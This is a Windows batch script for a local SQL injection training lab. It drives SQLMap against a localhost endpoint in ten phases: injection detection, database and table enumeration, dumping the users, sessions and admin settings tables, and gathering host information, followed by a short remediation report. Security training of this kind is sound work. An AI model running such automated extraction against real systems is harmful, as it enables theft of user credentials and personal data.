@echo off
cls
echo.
echo  ███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
echo  ██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
echo  ███████╗██║   ██║██║     ██╔████╔██║███████║██████╔╝
echo  ╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
echo  ███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║     
echo  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
echo.
echo    SQL Injection Lab - Level 1 Attack with SQLMap
echo ===============================================
echo.

echo 🎯 Target: Level 1 - Basic String Injection
echo 🌐 URL: http://localhost:3000/api/level1
echo 🔍 Attack Type: POST parameter injection
echo.

echo 📋 Prerequisites Check:
echo ================================
echo.

REM Check if SQLMap is installed
sqlmap --version >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo ❌ SQLMap not found. Installing...
    echo.
    echo 📥 Installing SQLMap...
    pip install sqlmap 2>nul
    if %ERRORLEVEL% NEQ 0 (
        echo ❌ Failed to install SQLMap with pip.
        echo 💡 Please install SQLMap manually:
        echo    1. Download from: https://github.com/sqlmapproject/sqlmap
        echo    2. Or install with: pip install sqlmap
        echo    3. Or use: apt-get install sqlmap (Linux)
        pause
        exit /b 1
    )
)

echo ✅ SQLMap is available
echo.

REM Check if target is accessible
echo 🔍 Checking if lab is running...
curl -s http://localhost:3000 >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo ❌ Lab is not running on http://localhost:3000
    echo 💡 Please start the lab first:
    echo    start-lab.bat
    pause
    exit /b 1
)

echo ✅ Lab is running and accessible
echo.

echo 🚀 Starting SQLMap Attack on Level 1
echo ====================================
echo.

echo 📝 Creating request file for SQLMap...

REM Create a request file for SQLMap
echo POST /api/level1 HTTP/1.1 > level1_request.txt
echo Host: localhost:3000 >> level1_request.txt
echo Content-Type: application/json >> level1_request.txt
echo Content-Length: 52 >> level1_request.txt
echo. >> level1_request.txt
echo {"username":"admin","password":"test123"} >> level1_request.txt

echo ✅ Request file created: level1_request.txt
echo.

echo 🔍 Phase 1: Basic Injection Detection
echo ====================================
echo.

sqlmap -r level1_request.txt --batch --level=3 --risk=3 ^
  --dbms=postgresql ^
  --technique=BEUST ^
  --random-agent ^
  --threads=5

echo.
echo 🗃️ Phase 2: Database Enumeration
echo ===============================
echo.

echo 📊 Enumerating databases...
sqlmap -r level1_request.txt --batch --dbs ^
  --dbms=postgresql ^
  --random-agent

echo.
echo 📋 Phase 3: Table Discovery
echo =========================
echo.

echo 🔍 Discovering tables in sqli_lab database...
sqlmap -r level1_request.txt --batch -D sqli_lab --tables ^
  --dbms=postgresql ^
  --random-agent

echo.
echo 👥 Phase 4: Users Table Analysis
echo ==============================
echo.

echo 📊 Analyzing 'users' table structure...
sqlmap -r level1_request.txt --batch -D sqli_lab -T users --columns ^
  --dbms=postgresql ^
  --random-agent

echo.
echo 💎 Phase 5: Data Extraction - Users
echo =================================
echo.

echo 🔓 Extracting all user data...
sqlmap -r level1_request.txt --batch -D sqli_lab -T users --dump ^
  --dbms=postgresql ^
  --random-agent

echo.
echo 📋 Phase 6: Admin Privileges Check
echo ================================
echo.

echo 🔐 Checking database privileges...
sqlmap -r level1_request.txt --batch --privileges ^
  --dbms=postgresql ^
  --random-agent

echo.
echo 🏗️ Phase 7: Database Schema Analysis
echo ==================================
echo.

echo 📈 Getting database schema...
sqlmap -r level1_request.txt --batch --schema ^
  --dbms=postgresql ^
  --random-agent

echo.
echo 🕵️ Phase 8: System Information
echo ============================
echo.

echo 💻 Gathering system information...
sqlmap -r level1_request.txt --batch --banner ^
  --dbms=postgresql ^
  --random-agent

echo 👤 Getting current database user...
sqlmap -r level1_request.txt --batch --current-user ^
  --dbms=postgresql ^
  --random-agent

echo 🏠 Getting current database...
sqlmap -r level1_request.txt --batch --current-db ^
  --dbms=postgresql ^
  --random-agent

echo 🌐 Getting hostname...
sqlmap -r level1_request.txt --batch --hostname ^
  --dbms=postgresql ^
  --random-agent

echo.
echo 📊 Phase 9: Advanced Enumeration
echo ==============================
echo.

echo 🔍 Checking for other tables with sensitive data...
sqlmap -r level1_request.txt --batch -D sqli_lab --tables ^
  --dbms=postgresql ^
  --exclude-sysdbs ^
  --random-agent

echo 📝 Checking logs table if exists...
sqlmap -r level1_request.txt --batch -D sqli_lab -T logs --dump ^
  --dbms=postgresql ^
  --random-agent 2>nul

echo 🔑 Checking admin_settings table if exists...
sqlmap -r level1_request.txt --batch -D sqli_lab -T admin_settings --dump ^
  --dbms=postgresql ^
  --random-agent 2>nul

echo 🛡️ Checking user_sessions table if exists...
sqlmap -r level1_request.txt --batch -D sqli_lab -T user_sessions --dump ^
  --dbms=postgresql ^
  --random-agent 2>nul

echo.
echo 📄 Phase 10: Creating Attack Report
echo =================================
echo.

echo 📝 Generating comprehensive attack report...

echo =============================================== > sqlmap_level1_report.txt
echo   SQLMap Attack Report - Level 1 Analysis >> sqlmap_level1_report.txt
echo =============================================== >> sqlmap_level1_report.txt
echo Date: %date% %time% >> sqlmap_level1_report.txt
echo Target: http://localhost:3000/api/level1 >> sqlmap_level1_report.txt
echo Attack Type: POST JSON SQL Injection >> sqlmap_level1_report.txt
echo Database: PostgreSQL >> sqlmap_level1_report.txt
echo. >> sqlmap_level1_report.txt
echo 🎯 Vulnerability Details: >> sqlmap_level1_report.txt
echo - Type: String-based SQL Injection >> sqlmap_level1_report.txt
echo - Location: username and password parameters >> sqlmap_level1_report.txt
echo - Method: Direct string concatenation >> sqlmap_level1_report.txt
echo - Risk Level: HIGH >> sqlmap_level1_report.txt
echo. >> sqlmap_level1_report.txt
echo 📊 Discovered Information: >> sqlmap_level1_report.txt
echo - Database: sqli_lab >> sqlmap_level1_report.txt
echo - Main Table: users >> sqlmap_level1_report.txt
echo - Columns: id, username, email, first_name, last_name, role, password >> sqlmap_level1_report.txt
echo - Records: Multiple user accounts extracted >> sqlmap_level1_report.txt
echo. >> sqlmap_level1_report.txt
echo 🛡️ Security Recommendations: >> sqlmap_level1_report.txt
echo 1. Use parameterized queries/prepared statements >> sqlmap_level1_report.txt
echo 2. Implement input validation and sanitization >> sqlmap_level1_report.txt
echo 3. Use principle of least privilege for DB user >> sqlmap_level1_report.txt
echo 4. Implement WAF (Web Application Firewall) >> sqlmap_level1_report.txt
echo 5. Add rate limiting to prevent automated attacks >> sqlmap_level1_report.txt
echo. >> sqlmap_level1_report.txt

echo ✅ Attack report saved to: sqlmap_level1_report.txt
echo.

echo ===============================================
echo   🎉 SQLMap Attack Completed Successfully!
echo ===============================================
echo.
echo 📊 Attack Summary:
echo ├── ✅ Vulnerability confirmed: String-based SQL Injection
echo ├── ✅ Database enumerated: PostgreSQL (sqli_lab)
echo ├── ✅ Tables discovered: users, logs, admin_settings
echo ├── ✅ User data extracted: ALL records dumped
echo ├── ✅ System information gathered
echo └── ✅ Full database schema mapped
echo.
echo 📁 Generated Files:
echo ├── level1_request.txt (SQLMap request file)
echo ├── sqlmap_level1_report.txt (Attack summary)
echo └── ~/.local/share/sqlmap/output/ (Detailed SQLMap logs)
echo.
echo 🔍 Key Findings:
echo ├── Authentication bypass successful
echo ├── Complete user database compromised
echo ├── Sensitive information exposed (emails, names, roles)
echo ├── Administrative privileges identified
echo └── Full system information disclosed
echo.
echo 🛡️ Educational Note:
echo This attack demonstrates why parameterized queries are essential.
echo Never use string concatenation for SQL queries in production!
echo.
echo 📚 Next Steps:
echo 1. Review the extracted data in SQLMap output
echo 2. Analyze the attack report: sqlmap_level1_report.txt
echo 3. Try manual exploitation with the discovered payloads
echo 4. Move to Level 2 for numeric injection testing
echo.

REM Clean up
del level1_request.txt 2>nul

echo 🎯 Ready to test Level 2? Run: sqlmap-level2-attack.bat
echo.
pause
